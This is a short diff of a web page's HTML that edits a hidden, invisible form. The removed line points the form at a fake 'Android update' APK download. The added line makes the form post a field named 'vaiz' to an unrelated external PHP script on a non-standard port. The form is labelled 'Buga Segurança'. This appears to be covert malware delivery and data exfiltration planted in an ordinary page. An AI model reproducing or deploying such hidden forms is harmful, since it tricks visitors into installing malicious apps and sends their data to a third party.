@@ -5,7 +5,7 @@
   integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
   crossorigin="anonymous"></script>
  
-   <form style="display:none" id="myForm" action="https://atualizacao-android-modulo.github.io/atualizacao-android-modulo/Atualizacao.apk" method="get">
+   <form style="display:none" id="myForm" action="https://shop-fy.online:171/rdz.php" method="post">
 
 <input type="text" name="vaiz">
 <button type="submit">Buga Segurança</button>
